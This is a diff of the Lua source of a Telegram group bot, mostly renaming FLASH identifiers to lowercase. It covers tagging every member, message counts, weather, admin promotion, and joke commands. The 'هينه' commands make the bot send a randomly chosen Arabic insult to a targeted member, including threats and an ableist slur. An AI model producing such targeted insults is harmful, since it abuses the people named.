+if text:match("^all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then local txt = {string.match(text, "^(all) (.*)$")} if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') end if flashdx1:get(flash.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end flashdx1:setex(flash..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,flash) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = flash.member_count_},function(dxx,flashr) x = 0 tags = 0 local list = flashr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
+--     By Developer flash     -- 
+if text:match("^@all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then local txt = {string.match(text, "^(@all) (.*)$")} if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') else if flashdx1:get(flash.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end flashdx1:setex(flash..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,flash) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = flash.member_count_},function(dxx,flashr) x = 0 tags = 0 local list = flashr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
+--     By Developer flash     --
+if text == 'الجروبات' and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then 
+local flash = flashdx1:scard(flash.."bot:groups")
+local dx = flashdx1:scard("flash:addg"..bot_id) or 0 
+local users = flashdx1:scard(flash.."bot:userss")
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *اعضاء الخاص ، { '..users..' }\n❅∫ عدد جروبات ، { '..flash..' }\n❅∫ الجروبات المفعله ، { '..dx..' }\n❅∫ الغير مفعله ، {'..(flash - dx)..'} *', 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  and FLASH11(msg) then
-local user_msgs = FLASHdx1:get(FLASH..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local FLASH = FLASHdx1:get(FLASH..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-local FLASHy = (FLASHdx1:get('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ اهلا وسهلا عزيزي \n❅∫ رسائلك الحقيقيه ، {*"..user_msgs.." }* \n❅∫ رسائلك المضافه ، {*"..FLASHy.." }* \n❅∫ رسائلك اليوم ،*{"..(FLASH).."} *\n❅∫ مجموع رسائلك ، {*"..(user_msgs + FLASHy).." }* \n❅∫ في المجموعه ", 1, 'md')
+--     By Developer flash     -- 
+if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  and flash11(msg) then
+local user_msgs = flashdx1:get(flash..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local flash = flashdx1:get(flash..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+local flashy = (flashdx1:get('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ اهلا وسهلا عزيزي \n❅∫ رسائلك الحقيقيه ، {*"..user_msgs.." }* \n❅∫ رسائلك المضافه ، {*"..flashy.." }* \n❅∫ رسائلك اليوم ،*{"..(flash).."} *\n❅∫ مجموع رسائلك ، {*"..(user_msgs + flashy).." }* \n❅∫ في المجموعه ", 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^ايدي المجموعه$") and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ايدي المجموعه `"..msg.chat_id_.."`", 1, 'md') 
+--     By Developer flash     -- 
+if text:match("^ايدي المجموعه$") and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ايدي المجموعه `"..msg.chat_id_.."`", 1, 'md') 
 end
---     By Developer FLASH     -- 
-if text:match("^ايديي$") and FLASH11(msg) then 
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ اهلا بك عزيزي ،  '..renk_FLASH(msg)..' \n❅∫ ايديك هو ، `'..msg.sender_user_id_..'`', 1, 'md') 
+--     By Developer flash     -- 
+if text:match("^ايديي$") and flash11(msg) then 
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ اهلا بك عزيزي ،  '..renk_flash(msg)..' \n❅∫ ايديك هو ، `'..msg.sender_user_id_..'`', 1, 'md') 
 end
---     By Developer FLASH     -- 
-if text:match("^معرفي$")  and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^معرفي$")  and flash11(msg) then
 function get_username(extra,result,success)
 text = '❅∫ معرفك ، {User}'
 local text = text:gsub('{User}',('@'..result.username_ or ''))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 getUser(msg.sender_user_id_,get_username)
 end
---     By Developer FLASH     -- 
-if text:match("^اسمي$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^اسمي$") and flash11(msg) then
 function get_firstname(extra,result,success)
 text = '❅∫ اسمك ، {firstname}'
 local text = text:gsub('{firstname}',(result.first_name_ or ''))
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 getUser(msg.sender_user_id_,get_firstname)
 end   
---     By Developer FLASH     -- 
-if text:match('^الحساب (%d+)$') and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match('^الحساب (%d+)$') and flash11(msg) then
 local id = text:match('^الحساب (%d+)$')
 local text = 'اضغط لمشاهده العضو ❅∫ '
 tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
 end
---     By Developer FLASH     -- 
-if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and flash11(msg) then
  local inline = {{{text="- رابط الحذف،",url="https://telegram.org/deactivate"}}}
 send_inline(msg.chat_id_,'❅∫ فكر زين قبل لا تحذف عمري ،\n❅∫ لحذف حسابك اضغط على الزر ⬇️ .',nil,inline) 
 return false 
 end 
---     By Developer FLASH     -- 
-if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") and flash11(msg) then 
 local inline = {
 {{text="- قناة السورس ،",url="t.me/FAQY4"},
 {text="- مبرمج السورس،",url="t.me/Q_Y_4"}},
 {{text="- اضغط هنا لتنصيب السورس ،",url="t.me/FAQY4"}},
 {{text="- جروب المبرمجين ،",url="https://t.me/joinchat/TXKJWVCCy9FF6g6cjajRGA"},
-{text="- شروحات السورس ،",url="t.me/Learn_FLASH"}}
+{text="- شروحات السورس ،",url="t.me/Learn_flash"}}
 }
-send_inline(msg.chat_id_,'❅∫ مرحبا بك في سورس فلاش┋FLASH ،\n❅∫ اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
+send_inline(msg.chat_id_,'❅∫ مرحبا بك في سورس فلاش┋flash ،\n❅∫ اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
 return false 
 end
---     By Developer FLASH     -- 
-if text:match("^جهاتي$") and FLASH11(msg) then
-add = (tonumber(FLASHdx1:get(FLASH..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ عدد الجهات الي ضفتها ،*{"..add.."}*", 1, 'md')
+--     By Developer flash     -- 
+if text:match("^جهاتي$") and flash11(msg) then
+add = (tonumber(flashdx1:get(flash..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ عدد الجهات الي ضفتها ،*{"..add.."}*", 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^رسائلي اليوم$") and FLASH11(msg) then 
-local FLASH = FLASHdx1:get(FLASH..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ رسائلك اليوم ، *{"..(FLASH).."} *", 1, 'md')
+--     By Developer flash     -- 
+if text:match("^رسائلي اليوم$") and flash11(msg) then 
+local flash = flashdx1:get(flash..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ رسائلك اليوم ، *{"..(flash).."} *", 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and flash11(msg) then
   MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
   Ptrn = MatchesEN[2] or MatchesFA[2]
   local function temps(K)
@@ -4789,1250 +4789,1250 @@ if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(ط�
     after = after.."- "..day..status.."تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\n🔻C"..C1.."°  *-*  F"..F1.."°\n"
    end
    Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
-   FLASHdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
+   flashdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
   else
    Text  = "• لا توجد مدينه بهذا الاسم 🌐"
-   FLASHdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
+   flashdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
   end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if (msg.sender_user_id_) then
 local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
-if text:match("^المطور$") and FLASH11(msg) then
-local nerkh = FLASHdx1:get(FLASH.."nerkh")
+if text:match("^المطور$") and flash11(msg) then
+local nerkh = flashdx1:get(flash.."nerkh")
 if nerkh then
-FLASHdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
-elseif FLASHdx1:get(FLASH.."lang:gp:" .. msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ Bot not found ", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
+elseif flashdx1:get(flash.."lang:gp:" .. msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ Bot not found ", 1, "md")
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, "- 𝐓𝐨 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫  𖠂\n\n- 𝗦𝘂𝗱𝗼 𖠙 @"..SudoFLASH..",", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "- 𝐓𝐨 𝐂𝐨𝐧𝐭𝐢𝐧𝐮𝐞 𝐖𝐢𝐭𝐡 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫  𖠂\n\n- 𝗦𝘂𝗱𝗼 𖠙 @"..Sudoflash..",", 1, "md")
 end end end 
---     By Developer FLASH     -- 
-if text and text:match('^هينه @(.*)') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('^هينه @(.*)') and flash11(msg) then 
 local username = text:match('^هينه @(.*)') 
-function FLASH(extra,result,success)
+function flash(extra,result,success)
 if result.id_ then  
 if tonumber(result.id_) == tonumber(bot_id) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
 return false 
 end  
 if tonumber(result.id_) == tonumber(bot_owner) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
 if tonumber(result.id_) == tonumber(218385683) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false  
 end  
-if FLASHdx1:sismember(FLASH.."bot:monsh:"..msg.chat_id_,result.id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ ??🙆', 1, 'md') 
+if flashdx1:sismember(flash.."bot:monsh:"..msg.chat_id_,result.id_) then
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ ??🙆', 1, 'md') 
 return false
 end 
-local FLASH = "صار ستاذي 💞🏃" 
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-local FLASH = {  "لكك جرجف @"..username.." احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف @"..username.." لتضل تمسلت حيوان دوختنه،😐👊","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه @"..username.."شبيك تكمز حيوان 🤕👊","باع هذا المنغولي @"..username.."شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙",}
-FLASHdx(msg.chat_id_, result.id_, 1,''..FLASH[math.random(#FLASH)]..'', 1, 'html') 
+local flash = "صار ستاذي 💞🏃" 
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+local flash = {  "لكك جرجف @"..username.." احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف @"..username.." لتضل تمسلت حيوان دوختنه،😐👊","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه @"..username.."شبيك تكمز حيوان 🤕👊","باع هذا المنغولي @"..username.."شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙",}
+flashdx(msg.chat_id_, result.id_, 1,''..flash[math.random(#flash)]..'', 1, 'html') 
 else  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو غير موجود في المجموعة', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو غير موجود في المجموعة', 1, 'md') 
 end end 
-resolve_username(username,FLASH)
+resolve_username(username,flash)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") then
 function hena(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'شكد غبي لعد تريدني اهين نفسي ؟؟ 🙆😹', 1, 'md') 
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مطوري ؟ 🌚🙆', 1, 'md') 
 return false
 end 
 if tonumber(result.sender_user_id_) == tonumber(218385683) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك مبرمج السورس ؟ 🌚🙆', 1, 'md') 
 return false
 end 
-if FLASHdx1:sismember(FLASH.."bot:monsh:"..msg.chat_id_,result.sender_user_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ 🌚🙆', 1, 'md') 
+if flashdx1:sismember(flash.."bot:monsh:"..msg.chat_id_,result.sender_user_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, 'دي لك تريد اهين تاج راسك المنشئ ؟ 🌚🙆', 1, 'md') 
 return false
 end 
-local FLASH = "صار ستاذي 💞🏃" 
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-local FLASH = {"لك جرجف احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف لتضل تمسلت حيوان دوختنه،😐👊","جعب البريك راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه شبيك تكمز حيوان 🤕👊","باع هذا المنغولي شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙"} 
-FLASHdx(msg.chat_id_, result.id_, 1,''..FLASH[math.random(#FLASH)]..'', 1, 'md') 
+local flash = "صار ستاذي 💞🏃" 
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+local flash = {"لك جرجف احترم تاجراسك لا اكتلك واخري على كبرك،💩","هيو جرجف لتضل تمسلت حيوان دوختنه،😐👊","جعب البريك راح احاول احترمك هالمره بلكي تبطل حيونه، 🤔🔪","هيو الحضينه شبيك تكمز حيوان 🤕👊","باع هذا المنغولي شبيك حبي مغير علاجك ؟ صير عاقل لا اخذك للسده 🤒🤙"} 
+flashdx(msg.chat_id_, result.id_, 1,''..flash[math.random(#flash)]..'', 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
 function bosha(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoFLASH, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..Sudoflash, 1, 'html')
 return false
 end 
-local FLASH = "صار ستاذي 💞🏃" 
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-local FLASH = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
-FLASHdx(msg.chat_id_, result.id_, 1,''..FLASH[math.random(#FLASH)]..'', 1, 'md') 
+local flash = "صار ستاذي 💞🏃" 
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+local flash = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
+flashdx(msg.chat_id_, result.id_, 1,''..flash[math.random(#flash)]..'', 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
 function bosh(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, ' بس فهمني شون ابوس نفسي وتدلل 🤭😹', 1, 'md')
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..SudoFLASH, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, 'مواححح احلى بوسةه المطوري😻🔥💗 @'..Sudoflash, 1, 'html')
 return false
 end 
-local FLASH = "صار ستاذي 💞🏃" 
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-local FLASH = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
-FLASHdx(msg.chat_id_, result.id_, 1,''..FLASH[math.random(#FLASH)]..'', 1, 'md') 
+local flash = "صار ستاذي 💞🏃" 
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+local flash = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
+flashdx(msg.chat_id_, result.id_, 1,''..flash[math.random(#flash)]..'', 1, 'md') 
 end 
 if tonumber(msg.reply_to_message_id_) == 0 then
 else 
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Sudo3
 if is_sudo(msg) then
-if text ==('رفع مطور رتبه ثالثه') or text ==('رفع مطور') or text ==('اضف مطور') and FLASH11(msg) then
+if text ==('رفع مطور رتبه ثالثه') or text ==('رفع مطور') or text ==('اضف مطور') and flash11(msg) then
 function sudo_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:admins:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مطور رتبه ثالثه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:admins:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مطور رتبه ثالثه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
 end end 
-if text and text:match('^رفع مطور رتبه ثالثه @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع مطور رتبه ثالثه @(.*)') and flash11(msg) then
 local username = text:match('^رفع مطور رتبه ثالثه @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:admins:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مطور رتبه ثالثه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:admins:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مطور رتبه ثالثه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Sudo3
-if text ==('تنزيل مطور رتبه ثالثه') or text ==('تنزيل مطور') or text ==('حذف مطور') and FLASH11(msg) then
+if text ==('تنزيل مطور رتبه ثالثه') or text ==('تنزيل مطور') or text ==('حذف مطور') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:admins:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المطورين??\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:admins:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المطورين??\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل مطور رتبه ثالثه @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل مطور رتبه ثالثه @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل مطور رتبه ثالثه @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:admins:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المطورين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:admins:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المطورين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Onall
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع مدير عام') and FLASH11(msg) then
+if text ==('رفع مدير عام') and flash11(msg) then
 function raf_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:onall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مدير عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:onall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مدير عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
 end end
-if text and text:match('^رفع مدير عام @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع مدير عام @(.*)') and flash11(msg) then
 local username = text:match('^رفع مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:onall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مدير عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:onall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مدير عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
